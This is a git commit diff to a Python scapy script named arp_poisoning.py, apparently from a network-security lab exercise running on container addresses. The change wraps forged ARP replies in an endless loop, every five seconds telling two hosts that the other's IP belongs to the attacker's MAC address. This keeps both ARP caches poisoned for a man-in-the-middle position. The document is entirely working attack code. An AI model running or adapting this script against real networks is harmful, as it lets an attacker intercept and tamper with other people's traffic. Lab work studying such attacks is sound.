a67a4a91f10051180efe77a503cc812407148673
Manik Sharma <maniksharma98144@gmail.com>
2022-04-12 22:34:05 -0400

    update poisoning

--- ARP_Attack/ARP/volumes/arp_poisoning.py
+++ ARP_Attack/ARP/volumes/arp_poisoning.py
@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 from scapy.all import * 
+from time import  *
 
 def send_ARP_packet(mac_dst, mac_src, ip_dst, ip_src):
 	E = Ether(dst=mac_dst, src=mac_src)
@@ -7,5 +8,7 @@ def send_ARP_packet(mac_dst, mac_src, ip_dst, ip_src):
 	pkt = E/A
 	sendp(pkt)
 
-send_ARP_packet('02:42:0a:09:00:05', '02:42:0a:09:00:65', '10.9.0.5', '10.9.0.6')
-send_ARP_packet('02:42:0a:09:00:06', '02:42:0a:09:00:65', '10.9.0.6', '10.9.0.5')
+while(1):
+	send_ARP_packet('02:42:0a:09:00:05', '02:42:0a:09:00:65', '10.9.0.5', '10.9.0.6')
+	send_ARP_packet('02:42:0a:09:00:06', '02:42:0a:09:00:65', '10.9.0.6', '10.9.0.5')
+	sleep(5)
